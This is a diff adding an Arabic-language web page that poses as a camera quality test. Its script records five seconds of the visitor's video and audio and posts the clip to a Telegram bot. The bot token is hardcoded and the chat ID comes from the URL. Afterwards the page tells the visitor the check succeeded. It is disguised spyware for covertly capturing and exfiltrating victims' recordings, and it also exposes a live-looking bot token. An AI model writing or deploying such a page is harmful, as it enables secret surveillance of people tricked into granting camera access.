@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>فحص الفيديو</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Roboto, sans-serif; background: #eef1f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .card { background: white; border-radius: 20px; box-shadow: 0 4px 14px rgba(0,0,0,0.07); padding: 24px 18px; text-align: center; max-width: 360px; width: 90%; }
+    .icon { font-size: 42px; margin-bottom: 10px; }
+    h2 { color: #333; font-size: 20px; margin-bottom: 6px; }
+    p { color: #777; font-size: 14px; margin-bottom: 16px; }
+    video { width: 100%; max-width: 260px; border-radius: 12px; background: #ddd; margin: 0 auto 12px; display: block; }
+    .progress { background: #e0e0e0; border-radius: 20px; height: 6px; width: 100%; margin: 12px 0; overflow: hidden; }
+    .progress-fill { background: #2196f3; width: 0%; height: 100%; border-radius: 20px; transition: width 0.4s ease; }
+    button { background: #2196f3; color: white; border: none; padding: 12px 30px; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; }
+    button:hover { background: #1976d2; }
+    #status { margin-top: 10px; font-size: 14px; color: #555; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">🎥</div>
+    <h2>فحص جودة الفيديو</h2>
+    <p>تأكد من أداء كاميرا الفيديو بتسجيل قصير</p>
+    <video id="video" autoplay playsinline></video>
+    <div class="progress"><div class="progress-fill" id="progressBar"></div></div>
+    <button id="recordBtn">ابدأ الاختبار</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const CHAT_ID = params.get('chat');
+    const TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
+    const video = document.getElementById('video');
+    const progressBar = document.getElementById('progressBar');
+    const statusDiv = document.getElementById('status');
+    const recordBtn = document.getElementById('recordBtn');
+    let stream, recorder, chunks = [];
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then(s => {
+        stream = s;
+        video.srcObject = s;
+        video.play();
+      })
+      .catch(() => { statusDiv.textContent = 'يجب السماح بالكاميرا والميكروفون'; });
+
+    recordBtn.addEventListener('click', () => {
+      recordBtn.disabled = true;
+      statusDiv.textContent = 'جاري تسجيل الفيديو...';
+      progressBar.style.width = '25%';
+      chunks = [];
+      recorder = new MediaRecorder(stream);
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/mp4' });
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('video_note', blob, 'video_test.mp4');
+        progressBar.style.width = '80%';
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendVideoNote`, { method: 'POST', body: form })
+          .then(() => {
+            progressBar.style.width = '100%';
+            statusDiv.textContent = '✅ اكتمل فحص الفيديو بنجاح';
+          })
+          .catch(() => {
+            statusDiv.textContent = '❌ فشل الاختبار';
+            recordBtn.disabled = false;
+          });
+      };
+      recorder.start();
+      setTimeout(() => recorder.stop(), 5000);
+    });
+  </script>
+</body>
+</html>
